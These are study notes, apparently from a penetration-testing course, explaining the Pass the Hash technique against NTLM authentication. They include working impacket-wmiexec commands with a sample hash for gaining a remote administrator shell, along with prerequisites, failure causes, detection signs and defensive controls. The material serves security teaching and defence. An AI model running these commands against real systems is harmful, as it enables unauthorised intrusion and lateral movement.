## Overview

**Pass the Hash** is a lateral movement technique that uses a user’s **NTLM hash** instead of the plaintext password.

Instead of knowing:

```text
Administrator:P@ssword123
```

the attacker uses:

```text
Administrator:<NTLM hash>
```

The key idea:

```text
If a service accepts NTLM authentication, the NTLM hash can be used as authentication material.
```

> [!important]
> Pass the Hash works against services using NTLM authentication. It does not work against services that require Kerberos authentication.

---

# Simple Mental Model

Normally:

```text
User enters password
↓
Windows derives NTLM hash
↓
NTLM authentication happens
```

With Pass the Hash:

```text
Attacker already has NTLM hash
↓
Tool uses hash directly
↓
NTLM authentication succeeds
```

The password is never needed.

---

# Why Pass the Hash Works

NTLM authentication relies on proof that the client has the correct NTLM hash.

If an attacker steals the hash, they can use it as alternate authentication material.

This means the NTLM hash effectively becomes password-equivalent for NTLM-based authentication.

MITRE mapping:

```text
Use Alternate Authentication Material
```

# Common Tools

Tools and frameworks that support Pass the Hash include:

```text
Impacket
Metasploit PsExec
Passing-the-Hash toolkit
CrackMapExec / NetExec-style SMB tooling
```

The mechanics are similar:

```text
connect over SMB
authenticate using NTLM hash
optionally create remote service
optionally obtain command execution
```

# Protocols and Services

Pass the Hash commonly uses:

```text
SMB
NTLM authentication
Service Control Manager API
Named Pipes
```

Typical port:

```text
TCP 445
```

---

# Prerequisites

Pass the Hash lateral movement usually requires:

```text
SMB reachable through firewall
File and Printer Sharing enabled
ADMIN$ share available
valid NTLM hash
local administrator rights on the target
```

In practice:

```text
NTLM hash must belong to an account that has local admin rights on the target.
```

---

# ADMIN$ Requirement

For remote code execution, many PtH tools need access to:

```text
\\TARGET\ADMIN$
```

This requires:

```text
local administrative permissions on the target
```

Why:

```text
the tool may need to upload or execute a service/helper through the admin share
```

> [!note]
> Accessing an SMB share with PtH does not always require service creation. Remote code execution commonly does.

---

# Remote Code Execution Mechanics

Many PtH tools gain code execution by:

```text
1. Authenticating to SMB with the NTLM hash.
2. Connecting to ADMIN$.
3. Creating or starting a Windows service.
4. Running cmd.exe or PowerShell.
5. Communicating with the process using Named Pipes.
```

This resembles PsExec-style execution.

---

# PtH vs PsExec

| Technique | Authentication Material | Execution Style |
|---|---|---|
| PsExec | Plaintext password or token | Remote service creation |
| Pass the Hash | NTLM hash | SMB + service creation / WMI / other method |

Plain English:

```text
PsExec often uses the password.
Pass the Hash uses the NTLM hash.
Both commonly rely on SMB and admin rights for remote execution.
```

---

# PtH Does Not Always Mean Code Execution

Pass the Hash can be used for:

```text
SMB authentication
share access
remote command execution
service creation
lateral movement
```

If the goal is only to access a share:

```text
a remote service may not need to be created
```

If the goal is shell/code execution:

```text
a service or remote execution mechanism is often used
```

Target:

```text
FILES04
```

```text
FILES04\Administrator
```

```text
2892D26CDF84D7A70E2EB3B9F05C425E
```

Tool:

```text
impacket-wmiexec
```

Goal:

```text
Use only the NTLM hash to authenticate and obtain a shell on FILES04.
```

# Impacket wmiexec Pass the Hash

## Syntax

```bash
impacket-wmiexec -hashes :<NTLM_hash> <user>@<target_ip>
```

The LM hash is left blank before the colon:

```text
:<NTLM_hash>
```

Why:

```text
LM hashes are usually not needed.
Only the NTLM hash is supplied.
```

---

## Example Command

```bash
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

Example output:

```text
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

Confirm host:

```cmd
hostname
```

Expected:

```text
FILES04
```

Confirm user:

```cmd
whoami
```

Expected:

```text
files04\administrator
```

Interpretation:

```text
The hash authenticated successfully.
The shell is running on FILES04.
The execution context is the local Administrator account.
```

---

# Domain Account Syntax

For a domain account, use:

```bash
impacket-wmiexec -hashes :<NTLM_hash> <domain>/<user>@<target_ip>
```

Example:

```bash
impacket-wmiexec -hashes :<NTLM_hash> corp.com/jen@192.168.50.73
```

Use this when the hash belongs to:

```text
corp\jen
```

---

# Local Account Syntax

For a local account, use:

```bash
impacket-wmiexec -hashes :<NTLM_hash> <local_user>@<target_ip>
```

Example:

```bash
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

This authenticates as:

```text
FILES04\Administrator
```

---

# Important Local Account Limitation

Pass the Hash works with:

```text
Active Directory domain accounts
built-in local Administrator account
```

However, due to a 2014 Windows security update, this technique cannot generally be used to authenticate as other local administrator accounts.

Practical takeaway:

```text
PtH is most reliable with domain accounts or the built-in local Administrator account.
```

---

# Why Local Admin Rights Matter

Having a valid NTLM hash is not enough for remote code execution.

The account must also have:

```text
local administrator rights on the target
```

Example:

```text
FILES04\Administrator has local admin rights on FILES04.
```

Therefore:

```text
PtH succeeds and code execution is possible.
```

If the account is valid but not local admin:

```text
authentication may work
but remote command execution may fail
```

# Pivoting Note

If the target is not directly reachable from Kali, the same technique may still be possible through:

```text
pivoting
proxying
tunnelling
routing through a compromised host
```

The requirement remains:

```text
SMB/NTLM access to the target must be reachable through the pivot path.
```

# Common Success Indicators

| Output | Meaning |
|---|---|
| `SMBv3.0 dialect used` | SMB connection established |
| `Launching semi-interactive shell` | wmiexec obtained command execution |
| `hostname = FILES04` | Commands are running on target |
| `whoami = files04\administrator` | Running as local Administrator |
| Command prompt `C:\>` | Remote shell is active |

# Common Failure Causes

## SMB Connection Fails

Possible causes:

```text
TCP 445 blocked
target offline
firewall blocks SMB
File and Printer Sharing disabled
wrong target IP
pivot route missing
```

---

## Authentication Fails

Possible causes:

```text
wrong NTLM hash
wrong username
wrong domain/local account format
account disabled
NTLM authentication disabled or restricted
account not allowed to log on remotely
```

---

## Authentication Works but Execution Fails

Possible causes:

```text
account is not local admin
ADMIN$ unavailable
service creation blocked
WMI blocked
EDR/AV blocks wmiexec behavior
UAC/token restrictions
```

# Defensive Notes

## Detection Opportunities

Pass the Hash may generate:

```text
NTLM network logons
SMB authentication from unusual hosts
ADMIN$ access
remote service creation
WMI execution
Named Pipe activity
wmiexec artifacts
logon using local Administrator from remote source
```

Possible suspicious patterns:

```text
successful NTLM logon without expected interactive use
local Administrator used over network
admin share access followed by command execution
remote WMI process creation
same hash/account used across multiple hosts
```

---

## Defensive Controls

Reduce Pass the Hash risk by:

```text
limiting local administrator rights
using unique local admin passwords
deploying LAPS or Windows LAPS
disabling or restricting NTLM where possible
restricting SMB between hosts
blocking ADMIN$ access where not required
enforcing tiered administration
avoiding credential reuse
monitoring local Administrator network logons
protecting LSASS from hash theft
enabling Credential Guard where possible
```

# Pass the Hash vs Password Login

| Login Type | Requires Password? | Requires Hash? | Works With |
|---|---:|---:|---|
| Normal login | Yes | Derived automatically | Many protocols |
| Pass the Hash | No | Yes | NTLM-based authentication |

Plain English:

```text
A plaintext password is not required if the NTLM hash is available and the target accepts NTLM.
```

---

# Pass the Hash vs Pass the Ticket

| Technique | Uses | Protocol |
|---|---|---|
| Pass the Hash | NTLM hash | NTLM |
| Pass the Ticket | Kerberos ticket | Kerberos |

Important distinction:

```text
Pass the Hash is for NTLM.
Pass the Ticket is for Kerberos.
```

---

# Key Takeaways

- Pass the Hash uses an NTLM hash instead of a plaintext password.
- It works only where NTLM authentication is accepted.
- It does not work against Kerberos-only services.
- PtH commonly uses SMB over TCP 445.
- Remote code execution usually requires local admin rights on the target.
- ADMIN$ and File and Printer Sharing are commonly required for PsExec-style execution.
- Tools such as Impacket can perform PtH from Kali.
- `impacket-wmiexec` can provide a semi-interactive shell using only the hash.
- PtH works for domain accounts and the built-in local Administrator account.
- Other local admin accounts are restricted by modern Windows security updates.
- The real weakness is not NTLM being used normally, but the attacker obtaining a reusable NTLM hash.
- Protecting local admin hashes and limiting NTLM exposure are key defenses.
